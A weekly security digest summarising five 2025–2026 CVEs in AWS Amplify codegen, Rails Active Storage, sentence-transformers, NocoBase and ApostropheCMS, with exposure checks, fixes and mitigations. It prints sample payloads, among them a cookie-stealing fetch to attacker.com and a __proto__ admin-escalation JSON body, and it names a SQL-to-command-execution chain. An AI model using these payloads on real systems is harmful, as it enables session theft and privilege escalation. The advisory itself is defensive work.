Five CVEs this week, all variations on the same theme: code or data slipping in through something that looked safe. An AWS Amplify Studio component turns schema properties into live browser JavaScript. A Rails image-variant pipeline converts a crafted upload into full server RCE. A Python model loader silently ignores `trust_remote_code=False` for local paths. A no-code platform's notification API accepts raw SQL from the internet. And a CMS prototype-pollution bug lets any editor write to `Object.prototype` and quietly become an admin. If you're on AWS or handle image uploads, start with the first two.

## CVE-2025-4318 — AWS Amplify Studio component schemas can run arbitrary JS in users' browsers

`@aws-amplify/codegen-ui-react` ≤ 2.20.2 (npm) | CVSS 9.5 | Published 2026-07-30

**Are you exposed?** You're exposed if you use AWS Amplify Studio and any authenticated user with Studio component-edit access can create or modify component definitions. The library converts schema properties of type `expression` directly into JavaScript without sanitization — a property value like `{"type":"expression","value":"fetch('//attacker.com/'+document.cookie)"}` becomes live code in every browser that loads the generated component. If you lock component creation to fully-trusted operators only and never accept user-supplied component schema, you're safe.

**Fix:** `npm i @aws-amplify/codegen-ui-react@2.20.3` — no breaking API changes reported.

**If you can't patch:** Restrict Amplify Studio component-create and component-edit access to trusted-operator accounts only until you can upgrade.

## CVE-2026-66066 — Rails Active Storage image variants can RCE via a crafted upload

`activestorage` < 7.2.3.2, 8.0.x < 8.0.5.1, 8.1.x < 8.1.3.1 (RubyGems) | CVSS 9.5 | Published 2026-07-30

**Are you exposed?** You're exposed if your app accepts image uploads and calls `.variant()` on them — the common pattern is `has_one_attached :avatar` followed by `user.avatar.variant(resize_to_limit: [200, 200])` anywhere in your views or controllers. Active Storage uses libvips by default with all file-format loaders enabled; a crafted image triggers libvips loader plugins that can read arbitrary server-side files (including env vars and secrets) or execute code. If you store and serve original uploads without calling `.variant()` at all, you're not affected.

**Fix:** `bundle update activestorage` to 7.2.3.2, 8.0.5.1, or 8.1.3.1 matching your Rails version. If you use the Rails umbrella gem, `bundle update rails` brings Active Storage along.

**If you can't patch:** Add an upload content-type allowlist at the controller layer and reject anything that isn't a known-safe MIME type before it reaches Active Storage processing.

## CVE-2026-68770 — sentence-transformers ignores `trust_remote_code=False` for local model paths

`sentence-transformers` (affected range unconfirmed — advisory under review; see GHSA-jx74-cqjv-2c67) (PyPI) | CVSS 9.3 | Published 2026-07-31

**Note:** This is an unreviewed advisory. The exploit mechanism is concrete but the exact patched version has not been confirmed by the maintainers yet; monitor the GHSA for updates.

**Are you exposed?** You're exposed if you load models from a local filesystem path that an attacker could influence — for example, `SentenceTransformer(user_supplied_path, trust_remote_code=False)`. The trust-gate check contains an `or os.path.exists(model_name_or_path)` clause that evaluates `True` for any local path, causing `trust_remote_code=False` to be silently ignored and any `modeling_*.py` file in that directory to execute. Loading models from the Hugging Face Hub by name (not a local path) is unaffected.

**Fix:** Watch GHSA-jx74-cqjv-2c67 and upgrade as soon as a patched version is tagged. Interim: `pip install --upgrade sentence-transformers`.

**If you can't patch:** Validate that every `model_name_or_path` argument is a known Hub identifier (a string containing `/`, no leading `/` or `.`) before passing it to `SentenceTransformer`.

## CVE-2026-52887 — NocoBase notification plugin SQL injection is unauthenticated on default installs

`@nocobase/plugin-notification-in-app-message` ≤ 2.0.60 (npm) | CVSS 10.0 | Published 2026-07-31

**Are you exposed?** You're exposed if you self-host NocoBase with the in-app notification plugin enabled and PostgreSQL as the database. The `latestMsgReceiveTimestamp` field inside the `filter` query parameter on `GET /api/myInAppChannels:list` is spliced directly into `Sequelize.literal()` with no binding or escaping. Since NocoBase allows anonymous sign-up by default, this is exploitable without credentials. On PostgreSQL with a superuser role (the default for many quick installs), an attacker can chain to `COPY ... TO PROGRAM` for OS command execution.

**Fix:** Bump all `@nocobase/*` packages to ≥ 2.0.61 together — they version in lockstep.

**If you can't patch:** Disable public user registration immediately, and place the NocoBase API behind a VPC firewall or network access control that blocks untrusted ingress.

## CVE-2026-53609 — ApostropheCMS prototype pollution lets editors silently escalate to admin

`apostrophe` ≤ 4.30.0 (npm) | CVSS 9.1 | Published 2026-07-31

**Are you exposed?** You're exposed if you run ApostropheCMS 4.x and have any users with editor role or above. The `apos.util.set()` utility traverses dot-notation property paths without sanitizing `__proto__` or `constructor` keys. A PATCH request to any REST API endpoint with a JSON body like `{"__proto__": {"isAdmin": true}}` writes to `Object.prototype` process-wide, bypassing role checks on all subsequent API calls until the server restarts. A compromised or malicious editor account can reach full admin without triggering any audit log entry.

**Fix:** `npm i apostrophe@4.31.0`

**If you can't patch:** Add express middleware or an API-gateway rule that rejects any incoming JSON body whose top-level keys include `__proto__`, `constructor`, or `prototype`.
